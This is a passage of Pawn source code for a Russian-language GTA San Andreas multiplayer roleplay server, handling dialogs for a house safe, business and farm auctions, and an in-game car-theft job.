			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1065,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][9] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1065,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][9]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][9] -= colvo1;
			GiveWeapon(playerid, 31,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа");
			return true;
		}
	case 1066:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1066,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][10] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 100)
			{
				ShowPlayerDialogEx(playerid,1066,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][10]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][10] -= colvo1;
			GiveWeapon(playerid, 33,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроный из сейфа");
			return true;
		}
	case 1067:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1067,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(PlayerInfo[playerid][pMats] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно материалов");
			if(colvo1 < 1 || colvo1 > 5000)
			{
				ShowPlayerDialogEx(playerid,1067,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][1] > 5000) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][1] += colvo1;
			PlayerInfo[playerid][pMats] -= colvo1;
			SCM(playerid,COLOR_YELLOW," Вы положили материалы в сейф");
			return true;
		}
	case 1068:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1068,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(PlayerInfo[playerid][pDrugs] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно наркотиков");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1067,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][0] > 1500) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][0] += colvo1;
			PlayerInfo[playerid][pDrugs] -= colvo1;
			SCM(playerid,COLOR_YELLOW," Вы положили наркотики в сейф");
			return true;
		}
	case 1069:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1069,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(PlayerInfo[playerid][pKeys] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно ключей");
			if(colvo1 < 1 || colvo1 > 50)
			{
				ShowPlayerDialogEx(playerid,1069,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][2] > 50) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][2] += colvo1;
			PlayerInfo[playerid][pKeys] -= colvo1;
			SCM(playerid,COLOR_YELLOW," Вы положили ключи в сейф");
			return true;
		}
	case 1070:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1070,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(PlayerInfo[playerid][pFishesPach] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно рыбы");
			if(colvo1 < 1 || colvo1 > 250)
			{
				ShowPlayerDialogEx(playerid,1070,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][3] > 250) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][3] += colvo1;
			PlayerInfo[playerid][pFishesPach] -= colvo1;
			SCM(playerid,COLOR_YELLOW," Вы положили рыбу в сейф");
			return true;
		}
	case 1071:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1071,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 23 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 500)
			{
				ShowPlayerDialogEx(playerid,1071,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][4] > 500) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][4] += colvo1;
			GiveWeapon(playerid, 23,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1072:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1072,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 24 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 450)
			{
				ShowPlayerDialogEx(playerid,1072,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][5] > 450) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][5] += colvo1;
			GiveWeapon(playerid, 24,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1073:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1073,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 25 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 450)
			{
				ShowPlayerDialogEx(playerid,1073,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][6] > 450) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][6] += colvo1;
			GiveWeapon(playerid, 25,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1074:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1074,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 29 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1074,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][7] > 1500) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][7] += colvo1;
			GiveWeapon(playerid, 29,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1075:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1075,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 30 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1075,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][8] > 1500) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][8] += colvo1;
			GiveWeapon(playerid, 30,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1076:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1076,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 31 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1076,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][9] > 1500) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][9] += colvo1;
			GiveWeapon(playerid, 31,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1077:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1077,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(GetPlayerWeapon(playerid) != 33 || GetPlayerAmmo(playerid) < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 100)
			{
				ShowPlayerDialogEx(playerid,1077,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(colvo1+HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][10] > 100) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][10] += colvo1;
			GiveWeapon(playerid, 33,-colvo1);
			SCM(playerid,COLOR_YELLOW," Вы положили патроны в сейф");
			return true;
		}
	case 1335:
		{
			if(response)
			{
				PlayerInfo[playerid][pJob] = 65;
				SCM(playerid, 0x6495EDFF, "Добро пожаловать в команду!");
				SCM(playerid, 0x6495EDFF, "На автомойке всегда найдется работа. Если тебе не на чем доехать, можешь взять скутер в гараже.");
				SCM(playerid, 0x6495EDFF, "(( Для взлома авто, подойди к нужной машине и если авто закрыто, зажми SPACE (Спринт) ))");
			}
			else SCM(playerid,COLOR_BLUE, "Проваливай! Не дай бог настучишь копам!");
		}
	case 2281:
		{
			if(!response) return true;
			if(!strlen(inputtext))
			{

				if(mesh[playerid] == 1) return SCM(playerid,0x30a0a7aa," Задание выполнено");
				return 1;

			}
		}

	case 1336:
		{
			if(!response) return true;
			timecar[playerid] = 0;
			if(PlayerInfo[playerid][pSkilla] > 0) PlayerInfo[playerid][pSkilla]--;
			SCM(playerid, COLOR_BLUE, "[SMS]: Ты нас разочаровал! Миссия провалена");
			avtocar[playerid] = 0;
			rabotaon[playerid] = 0;
			GangZoneDestroy(gangzonesa[playerid]);
		}
	case 1690:
		{
			if(!response) return true;
			bizselect[playerid] = bizname[playerid][listitem];
			if(auction_info[listitem] == 1)
			{
				if(WorkshopInfo[bizselect[playerid]][wAuction][1] == 0) format(YCMDstr,9,"%i",WorkshopInfo[bizselect[playerid]][wAuction][0]);
				else format(YCMDstr,16,"Скрыта");
				format(string,300,"{FFFF00}СТО [%i]\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",WorkshopInfo[bizselect[playerid]][wID]-1,WorkshopInfo[bizselect[playerid]][wAuction][1], YCMDstr);
				ShowPlayerDialogEx(playerid,1691,DIALOG_STYLE_LIST,"Аукцион Ферм и CTO",string, "Далее", "Закрыть");
			}
			else
			{
				if(FarmInfo[bizselect[playerid]][fAuction][1] == 0) format(YCMDstr,9,"%i",FarmInfo[bizselect[playerid]][fAuction][0]);
				else format(YCMDstr,16,"Скрыта");
				format(string,300,"{FFFF00}Ферма [%i]\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",FarmInfo[bizselect[playerid]][fID]-1,FarmInfo[bizselect[playerid]][fAuction][1], YCMDstr);
				ShowPlayerDialogEx(playerid,1693,DIALOG_STYLE_LIST,"Аукцион Ферм и CTO",string, "Далее", "Закрыть");
			}
			return true;
		}
	case 1694:
		{
			if(!response) return true;
			for(new i = 0; i <= TOTALFARM; i++) if(!strcmp(PlayerInfo[playerid][pName], FarmInfo[i][fAuctionName], true) && FarmInfo[i][fAuction][0] > 0) return SCM(playerid,COLOR_GREY," Вы уже делали ставку на другую Ферму/СТО");
			if(FGet(playerid)) return SCM(playerid,COLOR_GREY," У вас уже есть бизнес");
			if(GetPlayerID(FarmInfo[bizselect[playerid]][fAuctionName]) == playerid && FarmInfo[bizselect[playerid]][fAuction][0] > 0) return SCM(playerid,COLOR_GREY," Ваша ставка актуальна");
			if(strval(inputtext) < FarmInfo[bizselect[playerid]][fAuction][3]) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(strval(inputtext) < 100000 && FarmInfo[bizselect[playerid]][fAuction][3] == 0) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(PlayerInfo[playerid][pBank] < strval(inputtext)) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
			if(strval(inputtext)-FarmInfo[bizselect[playerid]][fAuction][0] < 100000) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(FarmInfo[bizselect[playerid]][fAuction][3] == 0) FarmInfo[bizselect[playerid]][fAuction][3] = strval(inputtext)/2;
			FarmInfo[bizselect[playerid]][fAuction][1] = FarmInfo[bizselect[playerid]][fAuction][0];
			FarmInfo[bizselect[playerid]][fAuction][0] = strval(inputtext);
			FarmInfo[bizselect[playerid]][fAuction][2] = 6;
			if(IsPlayerConnected(GetPlayerID(FarmInfo[bizselect[playerid]][fAuctionName])) && FarmInfo[bizselect[playerid]][fAuction][1] > 0)
			{
				format(string,144,"Игрок %s перебил вашу ставку на Ферму[%i]",PlayerInfo[playerid][pName],FarmInfo[bizselect[playerid]][fID]-1);
				SCM(GetPlayerID(FarmInfo[bizselect[playerid]][fAuctionName]),0x9615ffaa,string);
				PlayerInfo[GetPlayerID(FarmInfo[bizselect[playerid]][fAuctionName])][pBank] += FarmInfo[bizselect[playerid]][fAuction][1];
			}
			else if(!IsPlayerConnected(GetPlayerID(FarmInfo[bizselect[playerid]][fAuctionName])) && FarmInfo[bizselect[playerid]][fAuction][1] > 0)
			{
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",FarmInfo[bizselect[playerid]][fAuctionName]);
				mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",30,playerid,"");
			}
			strmid(FarmInfo[bizselect[playerid]][fAuctionName],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
			PlayerInfo[playerid][pBank] -= strval(inputtext);
			format(string,128," Вы перебили ставку на Ферму[%i]",FarmInfo[bizselect[playerid]][fID]-1);
			return SCM(playerid,0x9615ffaa,string);
		}
	case 1693: if(response && listitem == 3) return ShowPlayerDialogEx(playerid,1694,DIALOG_STYLE_INPUT,"Аукцион бизнесов","Введите сумму ставки", "Поставить", "Отмена");
	case 1691: if(response && listitem == 3) return ShowPlayerDialogEx(playerid,1692,DIALOG_STYLE_INPUT,"Аукцион бизнесов","Введите сумму ставки", "Поставить", "Отмена");
	case 1692:
		{
			if(!response) return true;
			for(new i = 1; i <= TOTALSHOPS; i++) if(!strcmp(PlayerInfo[playerid][pName], WorkshopInfo[i][wAuctionName], true) && WorkshopInfo[i][wAuction][0] > 0) return SCM(playerid,COLOR_GREY," Вы уже делали ставку на другую Ферму/СТО");
			if(WGet(playerid)) return SCM(playerid,COLOR_GREY," У вас уже есть бизнес");
			if(GetPlayerID(WorkshopInfo[bizselect[playerid]][wAuctionName]) == playerid && WorkshopInfo[bizselect[playerid]][wAuction][0] > 0) return SCM(playerid,COLOR_GREY," Ваша ставка актуальна");
			if(strval(inputtext) < WorkshopInfo[bizselect[playerid]][wAuction][3]) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(strval(inputtext) < 100000 && WorkshopInfo[bizselect[playerid]][wAuction][3] == 0) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(PlayerInfo[playerid][pBank] < strval(inputtext)) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
			if(strval(inputtext)-WorkshopInfo[bizselect[playerid]][wAuction][0] < 100000) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(WorkshopInfo[bizselect[playerid]][wAuction][3] == 0) WorkshopInfo[bizselect[playerid]][wAuction][3] = strval(inputtext)/2;
			WorkshopInfo[bizselect[playerid]][wAuction][1] = WorkshopInfo[bizselect[playerid]][wAuction][0];
			WorkshopInfo[bizselect[playerid]][wAuction][0] = strval(inputtext);
			WorkshopInfo[bizselect[playerid]][wAuction][2] = 6;
			if(IsPlayerConnected(GetPlayerID(WorkshopInfo[bizselect[playerid]][wAuctionName])) && WorkshopInfo[bizselect[playerid]][wAuction][1] > 0)
			{
				format(string,144,"Игрок %s перебил вашу ставку на СТО [%i]",PlayerInfo[playerid][pName],WorkshopInfo[bizselect[playerid]][wID]-1);
				SCM(GetPlayerID(WorkshopInfo[bizselect[playerid]][wAuctionName]),0x9615ffaa,string);
				PlayerInfo[GetPlayerID(WorkshopInfo[bizselect[playerid]][wAuctionName])][pBank] += WorkshopInfo[bizselect[playerid]][wAuction][1];
			}
			else if(!IsPlayerConnected(GetPlayerID(WorkshopInfo[bizselect[playerid]][wAuctionName])) && WorkshopInfo[bizselect[playerid]][wAuction][1] > 0)
			{
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",WorkshopInfo[bizselect[playerid]][wAuctionName]);
				mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",23,playerid,"");
			}
			strmid(WorkshopInfo[bizselect[playerid]][wAuctionName],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
			PlayerInfo[playerid][pBank] -= strval(inputtext);
			format(string,128," Вы перебили ставку на СТО [%i]",WorkshopInfo[bizselect[playerid]][wID]-1);
			return SCM(playerid,0x9615ffaa,string);
		}
	case 1667:
		{
			new sstring[10];
			if(!response) return true;
			bizselect[playerid] = bizname[playerid][listitem+1];
			if(BizzInfo[bizselect[playerid]][bLastStavka] == 0) format(sstring,9,"%i",BizzInfo[bizselect[playerid]][bStavka]);
			else format(sstring,32,"Скрыта");
			format(string,300,"{FFFF00}Бизнес: %s.\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",BizzInfo[bizselect[playerid]][bMessage],BizzInfo[bizselect[playerid]][bTimeStavka],BizzInfo[bizselect[playerid]][bLastStavka], sstring);
			ShowPlayerDialogEx(playerid,1668,DIALOG_STYLE_LIST,"Аукцион бизнесов",string, "Далее", "Закрыть");
		}
	case 1668:
		{
			if(!response) return 1;
			if(BGet(playerid)) return SCM(playerid,COLOR_GREY," У вас уже есть бизнес");
			if(PlayerInfo[playerid][pBank] <= BizzInfo[bizselect[playerid]][bBuyPrice]) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
			PlayerInfo[playerid][pBank] -= BizzInfo[bizselect[playerid]][bBuyPrice];
			BizzInfo[bizselect[playerid]][bLocked] = 0;
			BizzInfo[bizselect[playerid]][bPrice] = 100;
			BizzInfo[bizselect[playerid]][bTill] = 0;
			BizzInfo[bizselect[playerid]][bLandTax] = BizzLandTax[BizzInfo[bizselect[playerid]][bBuyPrice]]*12;
			BizzPay[bizselect[playerid]] = 0;
			BizzInfo[bizselect[playerid]][bLicense] = 0;
			BizzInfo[bizselect[playerid]][bStavka] = 0;
			BizzInfo[bizselect[playerid]][bMinStavka] = 0;
			BizzInfo[bizselect[playerid]][bTimeStavka] = 0;
			BizzInfo[bizselect[playerid]][bLastStavka] = 0;
			BizzInfo[bizselect[playerid]][bLockTime] = 0;
			BizzInfo[bizselect[playerid]][bEntranceCost] = 100;
			strmid(BizzInfo[bizselect[playerid]][bOwner],PlayerInfo[playerid][pName], 0, 32, 32);
			BGet(playerid), SendMes(playerid,COLOR_GREEN," Вы купили бизнес %i! {FFFFFF}(( Управление: /mm > Команды сервера > Бизнес ))", bizselect[playerid]);
			strmid(BizzInfo[bizselect[playerid]][bNameStavka], "-", 0, strlen("-"), 10);
			UpdateBizz(playerid);
			
		}
	//case 1668: if(response && listitem == 3) ShowPlayerDialogEx(playerid,1669,DIALOG_STYLE_INPUT,"Аукцион бизнесов","Введите сумму ставки", "Поставить", "Отмена");
	/*case 1669:
		{
			if(!response) return true;
			for(new i = 1; i <= TotalBizz; i++) if(!strcmp(PlayerInfo[playerid][pName], BizzInfo[i][bNameStavka], true) && BizzInfo[i][bStavka] > 0) return SCM(playerid,COLOR_GREY," Вы уже делали ставку на другой бизнес");
			if(BGet(playerid)) return SCM(playerid,COLOR_GREY," У вас уже есть бизнес");
			if(GetPlayerID(BizzInfo[bizselect[playerid]][bNameStavka]) == playerid && BizzInfo[bizselect[playerid]][bStavka] > 0) return SCM(playerid,COLOR_GREY," Ваша ставка актуальна");
			if(strval(inputtext) < BizzInfo[bizselect[playerid]][bMinStavka]) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(strval(inputtext) < 50000 && BizzInfo[bizselect[playerid]][bMinStavka] == 0) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(PlayerInfo[playerid][pBank] <= strval(inputtext)) return SCM(playerid,COLOR_GREY," На вашем банковском счету недостаточно денег");
			if(strval(inputtext)-BizzInfo[bizselect[playerid]][bStavka] < 15000) return SCM(playerid,COLOR_GREY," Вы не смогли перебить текущую ставку, попробуйте повысить цену");
			if(BizzInfo[bizselect[playerid]][bMinStavka] == 0) BizzInfo[bizselect[playerid]][bMinStavka] = strval(inputtext)/2;
			BizzInfo[bizselect[playerid]][bLastStavka] = BizzInfo[bizselect[playerid]][bStavka];
			BizzInfo[bizselect[playerid]][bStavka] = strval(inputtext);
			BizzInfo[bizselect[playerid]][bTimeStavka] = 6;
			if(IsPlayerConnected(GetPlayerID(BizzInfo[bizselect[playerid]][bNameStavka])) && BizzInfo[bizselect[playerid]][bLastStavka] > 0)
			{
				format(string,144,"Игрок %s перебил вашу ставку на бизнес %s",PlayerInfo[playerid][pName],BizzInfo[bizselect[playerid]][bMessage]);
				SCM(GetPlayerID(BizzInfo[bizselect[playerid]][bNameStavka]),0x9615ffaa,string);
				PlayerInfo[GetPlayerID(BizzInfo[bizselect[playerid]][bNameStavka])][pBank] += BizzInfo[bizselect[playerid]][bLastStavka];
			}
			else if(!IsPlayerConnected(GetPlayerID(BizzInfo[bizselect[playerid]][bNameStavka])) && BizzInfo[bizselect[playerid]][bLastStavka] > 0)
			{
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",BizzInfo[bizselect[playerid]][bNameStavka]);
				mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",1,playerid,"");
			}
			strmid(BizzInfo[bizselect[playerid]][bNameStavka],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
			PlayerInfo[playerid][pBank] -= strval(inputtext);
			format(string,128," Вы перебили ставку на бизнес %s",BizzInfo[bizselect[playerid]][bMessage]);
			SCM(playerid,0x9615ffaa,string);
		}*/
	case 1334:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pJob] != 65) return SCM(playerid,COLOR_GREY," Вы не можете взять контракт!");
					new car[20];
					new sss = 0;
					for(new i = GetVehiclePoolSize(); i >= 0; i--) if(IsANope(i) && sss < 20 && IsVehicleOccupied(i) == -1 && Vehicleforeach(i) != -1) car[sss] = i, sss++;
					if(sss == 0) return SCM(playerid,COLOR_GREY," На данный момент на сервере нет машин Nope Class'a");
					new randomik = Random(0, sss);
					avtocar[playerid] = car[randomik];
					new Float:X,Float:Y,Float:Z;
					GetVehiclePos(avtocar[playerid],X,Y,Z);
					format(string, 144, "Пригони нам тачку марки %s, и мы тебе хорошо заплатим.",VehicleNames[GetVehicleModel(avtocar[playerid])-400]);
					SCM(playerid,0x6495EDFF,string);
					SCM(playerid,0x6495EDFF,"(( Чтобы взломать замок зажми Спринт (по умолчанию пробел) ))");
					SCM(playerid,0x6495EDFF,"Подобную тачку наши парни недавно видели. Я обозначил её на твоей карте.");
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					gangzonesa[playerid] = GangZoneCreate(X-95,Y-80,X+70,Y+85);
					GangZoneShowForPlayer(playerid,gangzonesa[playerid],COLOR_BLACK);
					timecar[playerid] = 1200;
				}
			case 1:
				{
					if(PlayerInfo[playerid][pSkilla] < 50) return SCM(playerid,COLOR_GREY," Вам опыт слишком мал. (Минимум 50).");
					if(PlayerInfo[playerid][pJob] != 65) return SCM(playerid,COLOR_GREY," Вы не можете взять контракт!");
					new car[20];
					new sss = 0;
					for(new i = GetVehiclePoolSize(); i >= 0; i--) if(IsAB(i) && sss < 20 && IsVehicleOccupied(i) == -1 && Vehicleforeach(i) != -1) car[sss] = i, sss++;
					if(sss == 0) return SCM(playerid,COLOR_GREY," На данный момент на сервере нет машин B Class'a");
					new randomik = Random(0, sss);
					avtocar[playerid] = car[randomik];
					new Float:X,Float:Y,Float:Z;
					GetVehiclePos(avtocar[playerid],X,Y,Z);
					format(string, 144, "Пригони нам тачку марки %s, и мы тебе хорошо заплатим.",VehicleNames[GetVehicleModel(avtocar[playerid])-400]);
					SCM(playerid,0x6495EDFF,string);
					SCM(playerid,0x6495EDFF,"(( Чтобы взломать замок зажми Спринт ( по умолчанию пробел ) )).");
					SCM(playerid,0x6495EDFF,"Подобную тачку наши парни недавно видели. Я обозначил её на твоей карте.");
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					gangzonesa[playerid] = GangZoneCreate(X-95,Y-80,X+70,Y+85);
					GangZoneShowForPlayer(playerid,gangzonesa[playerid],COLOR_BLACK);
					timecar[playerid] = 600;
				}
			case 2:
				{
					if(PlayerInfo[playerid][pSkilla] < 150) return SCM(playerid,COLOR_GREY," Вам опыт слишком мал. (Минимум 150).");
					if(PlayerInfo[playerid][pJob] != 65) return SCM(playerid,COLOR_GREY," Вы не можете взять контракт!");
					new car[20];
					new sss = 0;
					for(new i = GetVehiclePoolSize(); i >= 0; i--) if(IsAA(i) && sss < 20 && IsVehicleOccupied(i) == -1 && Vehicleforeach(i) != -1) car[sss] = i, sss++;
					if(sss == 0) return SCM(playerid,COLOR_GREY," На данный момент на сервере нет машин A Class'a");
					new randomik = Random(0, sss);
					avtocar[playerid] = car[randomik];
					new Float:X,Float:Y,Float:Z;
					GetVehiclePos(avtocar[playerid],X,Y,Z);
					format(string, 144, "Пригони нам тачку марки %s, и мы тебе хорошо заплатим.",VehicleNames[GetVehicleModel(avtocar[playerid])-400]);
					SCM(playerid,0x6495EDFF,string);
					SCM(playerid,0x6495EDFF,"(( Чтобы взломать замок зажми Спринт (по умолчанию пробел) ))");
					SCM(playerid,0x6495EDFF,"Подобную тачку наши парни недавно видели. Я обозначил её на твоей карте.");
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
